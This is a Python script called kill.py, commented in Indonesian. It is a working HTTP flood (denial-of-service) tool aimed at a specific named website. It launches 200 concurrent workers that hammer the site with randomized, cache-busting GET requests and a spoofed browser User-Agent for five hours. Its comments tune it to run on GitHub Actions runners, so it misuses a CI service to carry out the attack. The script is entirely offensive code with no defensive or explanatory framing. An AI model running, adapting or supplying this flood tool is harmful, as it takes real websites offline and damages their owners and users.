#!/usr/bin/env python3
# kill.py — GitHub Actions Optimized (No Freeze)
import asyncio, aiohttp, random, string, sys, time

TARGET = "https://www.ronajiwa.my.id"
CONCURRENCY = 200 # GitHub runner gampang crash kalau 500, aman di 200
DURATION = 3600 * 5

def rand_path():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

async def worker(session_id, session):
    while True:
        try:
            url = f"{TARGET}/?q={rand_path()}"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache"
            }
            
            async with session.get(url, headers=headers, timeout=10, ssl=False) as r:
                await r.read()
                status = r.status
                cache = r.headers.get("x-vercel-cache", "NONE")
                
                # Paksa print keluar
                print(f"[BOT-{session_id}] {status} | cache={cache}", flush=True)
        except Exception:
            pass

async def main():
    conn = aiohttp.TCPConnector(limit=CONCURRENCY, ssl=False, force_close=True)
    async with aiohttp.ClientSession(connector=conn) as s:
        print(f"[*] STARTING FLOOD: {CONCURRENCY} WORKERS", flush=True)
        tasks = [asyncio.create_task(worker(i, s)) for i in range(CONCURRENCY)]
        try:
            await asyncio.sleep(DURATION)
        except KeyboardInterrupt:
            pass
        for t in tasks: t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

if __name__ == "__main__":
    asyncio.run(main())
